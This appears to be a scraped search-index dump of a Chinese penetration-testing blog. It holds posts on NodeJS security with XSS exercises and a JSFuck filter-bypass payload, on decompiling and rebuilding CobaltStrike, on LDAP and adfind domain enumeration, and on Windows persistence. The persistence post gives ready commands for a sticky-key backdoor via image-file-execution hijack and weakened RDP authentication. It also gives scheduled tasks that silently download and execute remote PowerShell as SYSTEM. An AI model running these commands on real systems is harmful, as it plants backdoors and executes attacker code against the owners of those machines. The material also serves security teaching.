应用中得到了广泛使用。大多数应用会使用第三方中间件来简化常见的 web 开发任务，比如 cookie、会话、用户身份验证、访问请求 POST 和 JSON 数据，日志记录、压缩 HTTP 响应等等。 一些中间件的引入顺序很重要(例如，如果会话中间件依赖于 cookie 中间件，则必须先添加 cookie 处理器)。绝大多数情况下要先调用中间件后设置路由，否则路由处理器将无法访问中间件的功能。morgan 是一个日志记录的中间件。 const express = require('express'); const app = express(); const download = require(__dirname + \"/download.js\"); const logger = require(\"morgan\"); app.use(logger('dev')); app.listen(80, () =\u003e { console.log('listen on 80'); }); app.use('/download', download); app.get('/', (req, res) =\u003e { res.send(\"Hello World\"); }); app.get('/news', (req, res) =\u003e { res.send(\"news page\"); }); 中间件和路由函数是按照声明顺序调用的 ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:2:2","tags":["渗透测试","NodeJS"],"title":"NodeJS 安全","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"2.2 渲染 PUG 模板引擎是一款健壮、灵活、功能丰富的 HTML 模板引擎专门为 Node 平台开发。 PUG 是由 Jade 改名而来。 Pug 通过缩进(表示标签间的嵌套关系)的方式来编写代码的过程，在编译的过程中，不需要考虑标签是否闭合的问题。 pugDemo： const express = require('express'); const app = express(); const path = require(\"path\"); app.listen(80, () =\u003e { console.log(\"listening on 80\"); }); app.set(\"views\", path.join(__dirname, 'views')); app.set('view engine', 'pug'); app.get('/', function(req, res) { res.render('index', {title: 'Hello', message: 'hello world pug engine'}) }) views/index.pug html head title=title body h1=message ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:2:3","tags":["渗透测试","NodeJS"],"title":"NodeJS 安全","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"3 威胁分析 ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:3:0","tags":["渗透测试","NodeJS"],"title":"NodeJS 安全","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"3.1 常见漏洞 代码执行，命令执行，XSS，SQL 注入，SSRF，文件上传 nodejs 对一些经典 web 漏洞，有一定防护，有的漏洞在其他语言中不明显。但在 nodejs 中比较突出。 require 链劫持(软件投毒)，正则表达式拒绝服务(ReDoS)，不安全的包。 ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:3:1","tags":["渗透测试","NodeJS"],"title":"NodeJS 安全","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"3.2 代码审计 3.2.1 项目结构 3.2.2 审计依赖 nsp 是检测包依赖的工具，被收购后，在 npm \u003e= 6.0.0，使用如下指令： npm audit npm audit fix 3.2.3 不安全的对象直接引用 function isAdmin(req, res, next) { if(req.user.role == \"admin\") // 检测账号用户是否是 admin return next(); // 如果不是，报错 res.redirect('/403'); } app.get('/admin', isAdmin, function(req, res) { res.send('secret'); }); 3.2.4 敏感信息泄露 app.use(function(err, req, res, next) { res.status(500).send(err.stack); }) 3.2.5 未经验证的重定向和转发 SSRF app.use('/redirect', function(req, res) { request(req.query.url, function(error, response, body){ if(err) { return res.send(body); } }) }) ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:3:2","tags":["渗透测试","NodeJS"],"title":"NodeJS 安全","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"3.3 安全配置 Helmet Strict-Transport-Security 强制实施与服务器的安全 (http over SSL / TLS)连接 X-Frame-Options 提供点击劫持保护 XSS-Protection 支持在最新的 Web 浏览器中内置的跨站点脚本(XSS)过滤器 X-Content-Type-Options 可防止浏览器从声明的内容类型中嗅探响应 Content-Security-Policy 可防止各种攻击，包括跨站点脚本和其他跨站点注入 ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:3:3","tags":["渗透测试","NodeJS"],"title":"NodeJS 安全","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"4 常见问题 ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:4:0","tags":["渗透测试","NodeJS"],"title":"NodeJS 安全","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"4.1 XSS sudo docker pull registry.cn-shanghai.aliyuncs.com/yhskc/chatsys:latest sudo docker run -d -p 0.0.0.0:32888:80 registry.cn-shanghai.aliyuncs.com/yhskc/chatsys Pug XSS 练习一： 采用了转义的方式进行输出，因此无法绕过 练习二： 采用未转义的方式，因此直接采用常规 payload 即可 练习三： 在 \u003cscript\u003e 标签中，因此直接采用行内闭合后拼接的方式可以 XSS，payload：1;alert(1) 练习四： 仍然是未转义模式，直接拼接即可 练习五： 发现其过滤了尖括号、alert、分号等敏感字符 利用 JSFuck 绕过滤 [][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])() ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:4:1","tags":["渗透测试","NodeJS"],"title":"NodeJS 安全","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["代码审计"],"content":"CobaltStrike二次开发","date":"2020-12-21","objectID":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/","tags":["代码审计"],"title":"CobaltStrike二次开发","uri":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"},{"categories":["代码审计"],"content":"CS 二次开发 工具： IDEA 自带的 java-decompiler.jar ","date":"2020-12-21","objectID":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/:0:0","tags":["代码审计"],"title":"CobaltStrike二次开发","uri":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"},{"categories":["代码审计"],"content":"1 CS 反编译 以 MAC 为例，IDEA 自带的 java-decompiler.jar 地址为： /Applications/IntelliJ IDEA.app/Contents/plugins/java-decompiler/lib/java-decompiler.jar 因为 MANIFEST.MF 中没有 main class 属性，没有指定主类，因此不能直接使用 java -jar，如果想要执行 java 包中具体的类，要使用 java -cp 输入如下命令： 使用方法： java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true cs_bin/cobaltstrike.jar cs_src 反编译后，会自动打包成 jar 包，右键解压后打开可以看到都是 .java 了，使用这个方法会非常方便，就不需要第三方工具,这个反编译出来的就可以直接放入 IntelliJ IDEA 中，可直接实现代码搜索，相关的交叉引用。 ","date":"2020-12-21","objectID":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/:1:0","tags":["代码审计"],"title":"CobaltStrike二次开发","uri":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"},{"categories":["代码审计"],"content":"2 CS 二次开发准备工作 ","date":"2020-12-21","objectID":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/:2:0","tags":["代码审计"],"title":"CobaltStrike二次开发","uri":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"},{"categories":["代码审计"],"content":"2.1 创建工程 打开 IntelliJ IDEA 选择 Create New Project 一直选择 Next。 创建工程目录： 创建好后需要先建立两个文件夹，右击选择 New Directory 建立一个 decompiled_src 文件夹，之后再建立一个 lib 文件夹。 ","date":"2020-12-21","objectID":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/:2:1","tags":["代码审计"],"title":"CobaltStrike二次开发","uri":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"},{"categories":["代码审计"],"content":"2.2 配置依赖关系 把刚刚反编译好的 CobaltStrike 复制到 decompiled_src 中，然后把它解压出来，可看到一个完整的反编译后的目录。 随后把原始的未编译的 CobaltStrike 放到刚刚新建的 lib 中去。 接下来需要对这个项目进行设置，点击 File 中的 Project Structure 在 Modules 对 Dependencies 进行设置。 点击添加 Jar or Directories，添加 ./lib 下的原始 JAR 包，并勾选 Export： ","date":"2020-12-21","objectID":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/:2:2","tags":["代码审计"],"title":"CobaltStrike二次开发","uri":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"},{"categories":["代码审计"],"content":"2.3 寻找 Main Class 点击 ./lib/META_INF/MANIFEST.MF ，复制 Main-Class： 将原始包中 MANIFEST.MF 的内容复制到项目中的 MANIFEST.MF ","date":"2020-12-21","objectID":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/:2:3","tags":["代码审计"],"title":"CobaltStrike二次开发","uri":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"},{"categories":["代码审计"],"content":"2.4 配置 Artifacts 接下来在 decompiled_src 目录中找到已经反编译完的 aggressor 主类，右击选择 Refactor ——Copy File 到 src 下的相同目录： ","date":"2020-12-21","objectID":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/:2:4","tags":["代码审计"],"title":"CobaltStrike二次开发","uri":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"},{"categories":["代码审计"],"content":"2.5 修改后编译 点击 Build -\u003e Build Artifacts -\u003e build ","date":"2020-12-21","objectID":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/:2:5","tags":["代码审计"],"title":"CobaltStrike二次开发","uri":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"},{"categories":["代码审计"],"content":"3 IDEA 其它 Tips ","date":"2020-12-21","objectID":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/:3:0","tags":["代码审计"],"title":"CobaltStrike二次开发","uri":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"},{"categories":["代码审计"],"content":"3.1 比对 JAR 包 在进行 bin 文件对比时，自动进行反编译 命令行形式： windows: /path/to/idea/bin/idea64.exe diff absolute/path/to/file1 absolute/path/to/file2 mac: /Applications/IntelliJ IDEA.app/Contents/MacOS/idea absolute/path/to/file1 absolute/path/to/file2 在 IDEA 中： 选中要比对的两个文件，Command + D 进行比对 ","date":"2020-12-21","objectID":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/:3:1","tags":["代码审计"],"title":"CobaltStrike二次开发","uri":"/2020/12/cs%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"},{"categories":["协议"],"content":"LDAP 协议相关知识介绍","date":"2020-12-14","objectID":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/","tags":["LDAP","协议"],"title":"LDAP 协议相关","uri":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/"},{"categories":["协议"],"content":"1 目录服务简介 日常生活中使用的电话薄内记录着亲朋好友的姓名、电话与地址等数据，它就是 telephone directory(电话目录)；计算机中的文件系统(file system)内记录着文件的文件名、大小与日期等数据，它就是 file directory(文件目录)。 如果这些目录内的数据能够由系统加以整理，用户就能够容易且迅速地查找到所需的数据，而 directory service(目录服务)提供的服务，就是要达到此目的。 目录服务是一个特殊的非关系型数据库，用来保存描述性的、基于属性的详细信息，支持过滤功能。 这种数据库与我们常⻅的关系型数据库(Mysql、SQL Server、Oracle等)的区别在于目录服务以树状的层次结构来存储数据，就好像 Linux/Unix 系统中的文件目录一样。此外，目录服务是一个专⻔为搜索和浏览而优化的数据库，有着优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。 综上所述，目录服务更适用于存储如组织架构之类的信息。 ","date":"2020-12-14","objectID":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/:1:0","tags":["LDAP","协议"],"title":"LDAP 协议相关","uri":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/"},{"categories":["协议"],"content":"2 LDAP 简介 LDAP(Light Directory Access Portocol)是基于 X.500 标准的轻量级目录访问协议。LDAP 协议之前有一个 X.500 DAP 协议规范，该协议十分复杂，是一个重量级的协议，后来对 X.500 进行了简化，诞生了 LDAP 协议，与 X.500 相比变得较为轻量，其实 LDAP 协议依然复杂。 LDAP 约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容。而 LDAP 协议的实现，有着众多版本，例如微软的 Active Directory 是 LDAP 在 Windows 上的实现，AD 实现了 LDAP 所需的树形数据库、具体如何解析请求数据并到数据库查询然后返回结果等功能。再例如 OpenLDAP 是可以运行在 Linux 上的 LDAP 协议的开源实现。而我们平常说的 LDAP Server，一般指的是安装并配置了 Active Directory、OpenLDAP 这些程序的服务器。 ","date":"2020-12-14","objectID":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/:2:0","tags":["LDAP","协议"],"title":"LDAP 协议相关","uri":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/"},{"categories":["协议"],"content":"3 LDAP 的基本模型 每一个系统、协议都会有属于自己的模型，LDAP 也不例外，在了解 LDAP 的基本模型之前我们需要先了解几个 LDAP 的目录树概念: 目录树：在一个目录服务系统中，整个目录信息集可以表示为一个目录信息树，树中的每个节点是 一个条目。 条目：每个条目就是一条记录，每个条目有自己的唯一可区别的名称(DN)。 对象类：objectClass，与某个实体类型对应的一组属性，对象类是可以继承的，这样父类的必须属 性也会被继承下来。 属性：描述条目的某个方面的信息，一个属性由一个属性类型和一个或多个属性值组成，属性有必须属性和非必须属性。 LDAP 目录以树状的层次结构来存储数据，最顶层即根部称作「基准DN」，形如 dc=geekby,dc=xyz 或者 ou=geekby.xyz，前一种方式更为灵活也是 Windows AD 中使用的方式。在根目录的下面有很多的文件和目录，为了把这些大量的数据从逻辑上分开，LDAP 像其它的目录服务协议一样使用 OU(Organization Unit)，可以用来表示公司内部机构，如部⻔等，也可以用来表示设备、人员等。同时 OU 还可以有子 OU，用来表示更为细致的分类。LDAP 中每一条记录都有一个唯一的区别于其它记录的名字 DN(Distinguished Name)，其处在「叶子」位置的部分称作 RDN；如 dn:cn=tom,ou=animals,dc=geekby,dc=xyz 中 tom 即为 RDN；RDN 在一个 OU 中必须是唯一的。 因为 LDAP 数据是「树」状的，而且这棵树是可以无限延伸的，假设你要树上的一条记录，如何寻找它的位置呢？当然首先要说明是哪一棵树(dc)，然后是从树根到那个苹果所经过的所有「分叉」(ou)，最后就是这个苹果的名字(cn)。知道了树(dc=geekby,dc=xyz)，分叉 (ou=IT,ou=Worker,ou=Pentester)，苹果(cn=abc)，就可以找到我们想要的苹果了： dn:cn=abc,ou=IT,ou=Worker,ou=Pentester,dc=geekby,dc=xyz LDAP 的功能模型中定义了一系列利用 LDAP 协议的操作。它包含了三个部分: 查询操作(Interrogation Operations)：容许查询目录和取得数据。它包含 Search Operating 和 Compare Operation。 更新操作(Update Operations)：容许添加(ADD)、删除(Delete)、重命名(Rename)和改变目录(Modify) 认证和管理操作(Authentication And Control Operations)容许客户端在目录中识别自己，并且能够控制一个 Session 的性质。 ","date":"2020-12-14","objectID":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/:3:0","tags":["LDAP","协议"],"title":"LDAP 协议相关","uri":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/"},{"categories":["协议"],"content":"4 LDAP 和 AD 的关系 Active Directory 是微软基于 LDAP 协议的一套解决方案(LDAP 服务器 + 应用)， 而 LDAP 是与 AD 交互的协议之一。 Active Directory 解决了细粒度的权限控制「谁」以 「什么权限」访问「什么」。AD 在 LDAP v3 规范之上还有自定义扩展，例如，帐户锁定，密码到期等。 ","date":"2020-12-14","objectID":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/:4:0","tags":["LDAP","协议"],"title":"LDAP 协议相关","uri":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/"},{"categories":["协议"],"content":"5 利用 LDAP 收集域信息 通常情况下，任何一名认证用户都可以通过 LDAP 来获取大量有趣的域信息。因此，在信息收集阶段，可以利用 LDAP 查询、整理域环境的相关信息。 ","date":"2020-12-14","objectID":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/:5:0","tags":["LDAP","协议"],"title":"LDAP 协议相关","uri":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/"},{"categories":["协议"],"content":"5.1 相关工具 adfind 可以在命令下获取域的详细信息，用法参考：http://www.joeware.net/freetools/tools/adfind/usage.htm ADExplorer 是独立的可执行软件，无需安装。 除了查询域信息外，ADExplorer 还可以拍摄快照，可以快照保存在本地，并可以使用 ADExplorer 打开进行操作。 ldapsearch LDAPDomainDump 为 python 开发，可以通过 LDAP 收集和解析数据，并将其输出为人类可读的 HTML 格式以及机器可读的 JSON 和 CSV/TSV 格式。 domain_groups: 目标域的组列表 domain_users: 目标域的用户列表 domain_computers: 目标域的计算机账号列表 domain_policy: 域策略，例如是否需要密码等 domain_trusts: 传入和传出域属性以及是否受信任 ","date":"2020-12-14","objectID":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/:5:1","tags":["LDAP","协议"],"title":"LDAP 协议相关","uri":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/"},{"categories":["协议"],"content":"5.2 获取域信息实例 环境： 域控:192.168.66.26 (dc.company.com) 域用户凭证：pentest\\win7user:123456aB 使用工具 Adfind.exe 下面列出了 Adfind 的一些使用实例，主要是对工具参数进行介绍。我们可以根据需求修改命令，查 询我们所关注的任何信息。比如查询已控凭证所属的组、查询特定组的成员、根据计算机名推测用户可 能有权限的计算机等。 #查询域内所有用户详细信息 adfind -h 10.1.26.128 -u company\\test -up Geekby -sc u:* #查询域内特定用户详细信息 adfind -h 10.1.26.128 -u company\\test -up Geekby -sc u:test #查询域内特定用户特定信息(mail) adfind -h 10.1.26.128 -u company\\test -up Geekby -sc u:test mail #查询域内所有用户dn信息 adfind -h 10.1.26.128 -u company\\test -up Geekby -sc u:* -dn #查询域内用户数量 adfind -h 10.1.26.128 -u company\\test -up Geekby -sc u:* -c #查询域内所有组详细信息 adfind -h 10.1.26.128 -u company\\test -up Geekby -sc g:* #查询域内组名内包含“Admin”的所有组详细信息 adfind -h 10.1.26.128 -u company\\test -up Geekby -sc g:*Admin* #查询域内所有OU详细信息 adfind -h 10.1.26.128 -u company\\test -up Geekby -sc o:* #查询域内所有计算机详细信息 adfind -h 10.1.26.128 -u company\\test -up Geekby -sc c:* #查询域内所有站点详细信息 adfind -h 10.1.26.128 -u company\\test -up Geekby -sc site:* #查询域内所有子网详细信息 adfind -h 10.1.26.128 -u company\\test -up Geekby -sc subnet:* #查询域的信任关系 adfind -h 10.1.26.128 -u company\\test -up Geekby -sc trustdmp #查询域内spn的详细信息 adfind -h 10.1.26.128 -u company\\test -up Geekby -sc spn:* #搜索禁用的用户dn adfind -h 10.1.26.128 -u company\\test -up Geekby -b DC=company,DC=com -f userAccountControl:AND:=514 -dn ","date":"2020-12-14","objectID":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/:5:2","tags":["LDAP","协议"],"title":"LDAP 协议相关","uri":"/2020/12/ldap-%E5%8D%8F%E8%AE%AE/"},{"categories":null,"content":"welcome Welcome to my blog ","date":"2020-12-11","objectID":"/about/:0:0","tags":null,"title":"关于我","uri":"/about/"},{"categories":null,"content":"whoami ID：Geekby Team：移动互联网安全技术国家工程实验室 学历：北邮硕士在读 Web Security 方向 CTFer 如果有什么问题，欢迎提出探讨~ ","date":"2020-12-11","objectID":"/about/:1:0","tags":null,"title":"关于我","uri":"/about/"},{"categories":["内网渗透"],"content":"权限维持","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/","tags":["内网渗透","权限维持"],"title":"权限维持","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["内网渗透"],"content":"权限维持 ","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:0:0","tags":["内网渗透","权限维持"],"title":"权限维持","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["内网渗透"],"content":"1 操作系统后门 ","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:1:0","tags":["内网渗透","权限维持"],"title":"权限维持","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["内网渗透"],"content":"1.1 粘滞键后门 1.1.1 传统方法 在 windows/system32 下，直接将 sethc 程序替换成 cmd.exe 如果目标机是 windows vista 以上的，即 windows vista 以后出的系统，修改 sethc 会提示需要 trustedinstaller 权限，trustedinstaller 是一个安全机制，即系统的最高权限，权限比 administrator 管理员高. windows 权限分为三种从低到高依次是 user，administrator，system。而 trustedinstaller 比 administrator 高但没有 system 高，这么做的好处是避免了一些恶意软件修改系统文件的可能，坏处就是自己不能直接操作了，所以要先修改 sethc 需要将其所有者改为改为我们当前管理员用户。 在该所有者之前，直接编辑其权限都是灰色的，不能修改，有了所有权之后，便可以编辑其权限，这里需要给予自己权限，如下图： 这时可以重命名，也可以直接删除，然后复制 cmd 修改 sethc 即可，然后在锁屏没有密码情况下，可以直接按 5 下 shift 调出 cmd，执行添加新用户等操作，如下图： 1.1.2 新方法 新方法设置粘滞键后门是通过注册表来实现，整体的方法思路就是通过修改注册表的映像劫持和打开其远程桌面来实现。 REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" 命令说明：reg add 是向注册表添加记录，后面跟的是注册表的位置，这里需要注意的是 HKLM 实际上是 HKEY_LOCAL_MACHINE 的缩写。Image File Execution Option 这个目录就是用来设置镜像劫持的，要被劫持的就是命令中的 sethc 粘滞键程序，随后通过 /v 来指定键名，这个键名 debugger 是固定的，然后通过 /t 来指定类型，即 REG_SZ 字符串类型，最后通过 /d 来指定键的值，即被恶意替换的程序，也就是我们的 cmd。 设置完镜像劫持后就已经有了我们旧方法中直接替换 sethc 程序的效果，但我们为了方便利用，可以开启目标机的远程桌面，这里我们也通过注册表来设置一下，需要设置两个参数。 1.1.2.1 关闭 RDP 用户鉴定选项 第一个是把远程桌面链接的用户鉴定选项设置为关闭状态，即值为 0，命令行运行以下命令： REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 用户鉴权即 userauthentication 这个参数的作用： 0 的说明是进行远程桌面前不需要用户身份验证，还是默认值，1 说明的是进行远程桌面前需要进行用户身份验证。为了更好的理解，我们来看下他们的区别，下面是 userauthentication 为 1 的时候： 当 userauthentication 为 1 时即远程桌面前进行用户身份验证，这时候远程链接输入 ip 后会要求输入用户名和密码，输入用户名不输入密码直接点连接会提示身份验证错误。而当 userauthentication 为 0 时，即连接前不进行身份验证，这时候输入用户名不输入密码点连接会直接到远程桌面的锁屏那一步。所以设置为 0 我们可以直接到目标的锁屏然后调起 cmd。 注：在 windows server 2012 上默认为 0 1.1.2.2 更改 RDP 安全层设置 第二个是把远程桌面连接的安全层设置为 0，命令行运行以下命令： REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD /d 0 0 就是连接前使用 RDP 协议进行身份验证，RDP 即远程桌面连接，可以简单理解为就是关闭验证。1 是指在连接前两端协商来进行身份验证，这个是默认值。2 就是使用 tls 协议来进行。来看下 0 和 1 的区别： 在 userauthentication 用户鉴权为 0 的情况下，securitylayer 安全层为 1 的时候是点击连接后输入用户名然后再点连接到目标桌面，而把 securitylayer 改为 0 时，点击连接，会直接到用户的锁屏桌面，省去了输入凭证那一步。所以我们设置为 0，可以直接跳到锁屏桌面调 cmd。 注：在 windows server 2012 上默认为 1 1.1.3 测试结果 经过测试，在 win10 上 RDP 连接断开时 msf 的会话立刻断开，在 windows server 2008 上成功。 ","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:1:1","tags":["内网渗透","权限维持"],"title":"权限维持","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["内网渗透"],"content":"1.2 注册表后门 Run：该项下的键值即为开机启动项 位置： \\HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run msf 下的命令： use exploit/windows/local/persistence ","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:1:2","tags":["内网渗透","权限维持"],"title":"权限维持","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["内网渗透"],"content":"1.3 计划任务后门 schtasks /Create 创建新任务。 /Delete 删除计划任务。 /Query 显示所有计划任务。 /Change 更改计划任务属性。 /Run 按需运行计划任务。 /End 中止当前正在运行的计划任务。 /ShowSid 显示与计划的任务名称相应的安全标识符。 # schtasks 命令 # 每天晚上 03:30 定时执行 schtasks /create /tn \"TimedTask1\" /tr C:\\Users\\Administrator\\Desktop\\TimedTask\\Run.bat /sc DAILY /st 03:30 # statement A # 查询创建的任务 schtasks /query /tn TimedTask1 /v # 立即运行创建的任务 schtasks /run /tn TimedTask1 # 删除任务 schtasks /delete /tn TimedTask1 #(X64) - On System Start schtasks /create /tn PentestLab /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'\" /sc onstart /ru System #(X64) - On User Idle (30mins) schtasks /create /tn PentestLab /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'\" /sc onidle /i 30 #(X86) - On User Login schtasks /create /tn PentestLab /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'\" /sc onlogon /ru System #(X86) - On System Start schtasks /create /tn PentestLab /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'\" /sc onstart /ru System #(X86) - On User Idle (30mins) schtasks /create /tn PentestLab /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'\" /sc onidle /i 30 ","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:1:3","tags":["内网渗透","权限维持"],"title":"权限维持","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["内网渗透"],"content":"1.4 wmi 无文件后门 evil3.vbs -\u003e 